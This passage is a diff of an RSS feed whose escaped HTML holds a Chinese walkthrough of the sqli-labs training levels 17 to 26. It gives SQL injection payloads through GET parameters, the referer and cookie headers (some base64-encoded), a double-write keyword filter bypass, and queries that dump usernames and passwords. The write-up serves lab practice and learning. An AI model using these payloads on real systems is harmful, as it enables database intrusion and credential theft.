class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x7e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆出所有表&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
@@ -1059,8 +1059,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---18&#34;&gt;less - 18&lt;/h2&gt;
-&lt;p&gt;这关也使用报错注入，但是注入点不同，查看源代码&lt;/p&gt;
+&lt;h2 id=&#34;less---18&#34;&gt;less - 18
+&lt;/h2&gt;&lt;p&gt;这关也使用报错注入，但是注入点不同，查看源代码&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251512795.png&#34;
 	
 	
@@ -1084,12 +1084,12 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;之后就可以使用&lt;code&gt;less-17&lt;/code&gt;报错注入的方法了&lt;/p&gt;
-&lt;h2 id=&#34;less---19&#34;&gt;less - 19&lt;/h2&gt;
-&lt;p&gt;这里的注入点变成了&lt;code&gt;referer&lt;/code&gt;请求头，写法如下&lt;/p&gt;
+&lt;h2 id=&#34;less---19&#34;&gt;less - 19
+&lt;/h2&gt;&lt;p&gt;这里的注入点变成了&lt;code&gt;referer&lt;/code&gt;请求头，写法如下&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,2)#
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;方法同&lt;code&gt;less-18&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---20&#34;&gt;less - 20&lt;/h2&gt;
-&lt;p&gt;这关注入点在&lt;code&gt;cookie&lt;/code&gt;字段&lt;/p&gt;
+&lt;h2 id=&#34;less---20&#34;&gt;less - 20
+&lt;/h2&gt;&lt;p&gt;这关注入点在&lt;code&gt;cookie&lt;/code&gt;字段&lt;/p&gt;
 &lt;p&gt;这里需要先正常登录，然后进入登录界面&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251536259.png&#34;
 	
@@ -1113,8 +1113,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;方法同&lt;code&gt;less-17&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---21&#34;&gt;less - 21&lt;/h2&gt;
-&lt;p&gt;源代码中&lt;/p&gt;
+&lt;h2 id=&#34;less---21&#34;&gt;less - 21
+&lt;/h2&gt;&lt;p&gt;源代码中&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE username=(&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$cookee&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;) LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以这里闭合符为&lt;code&gt;&#39;)&lt;/code&gt;,注入点依然是&lt;code&gt;cookie&lt;/code&gt;字段，不同点在于这关注入语句需要进行&lt;code&gt;base64编码&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405251548942.png&#34;
@@ -1127,10 +1127,10 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---22&#34;&gt;less - 22&lt;/h2&gt;
-&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-21&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;less---23&#34;&gt;less - 23&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png&#34;
+&lt;h2 id=&#34;less---22&#34;&gt;less - 22
+&lt;/h2&gt;&lt;p&gt;闭合符为&lt;code&gt;&amp;quot;&lt;/code&gt;，方法同&lt;code&gt;less-21&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less---23&#34;&gt;less - 23
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271249369.png&#34;
 	
 	
 	
@@ -1149,8 +1149,8 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;),3 or &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; ),3 or &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,(select group_concat(password,username) from users),3 or &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---24&#34;&gt;less - 24&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---24&#34;&gt;less - 24
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271309455.png&#34;
 	
 	
 	
@@ -1210,8 +1210,8 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以看到我们成功修改了&lt;code&gt;admin&lt;/code&gt;的密码，之后就可以用它的权限登录。&lt;/p&gt;
-&lt;h2 id=&#34;less---25&#34;&gt;less - 25&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png&#34;
+&lt;h2 id=&#34;less---25&#34;&gt;less - 25
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405271344216.png&#34;
 	
 	
 	
@@ -1223,11 +1223,11 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这关将&lt;code&gt;or&lt;/code&gt;和&lt;code&gt;and&lt;/code&gt;替换为空并且无论大小写，但是它只替换了一次，所以我们可以双写绕过，如果注入语句中含有&lt;code&gt;or&lt;/code&gt;，我们可以将其写为&lt;code&gt;oorr&lt;/code&gt;，这样即使替换为空，依然得到&lt;code&gt;or&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---25a&#34;&gt;less - 25a&lt;/h2&gt;
-&lt;p&gt;变成了数字型，方法同上&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---25a&#34;&gt;less - 25a
+&lt;/h2&gt;&lt;p&gt;变成了数字型，方法同上&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;infoorrmation_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;security&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---26&#34;&gt;less - 26&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;less---26&#34;&gt;less - 26
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405300042352.png&#34;
 	
 	
 	
@@ -1256,9 +1256,9 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;爆密码账户&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-&lt;h3 id=&#34;get传参和post传参注释符使用的不同&#34;&gt;get传参和post传参注释符使用的不同&lt;/h3&gt;
-</description>
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结
+&lt;/h2&gt;&lt;h3 id=&#34;get传参和post传参注释符使用的不同&#34;&gt;get传参和post传参注释符使用的不同
+&lt;/h3&gt;</description>
         </item>
         
     </channel>
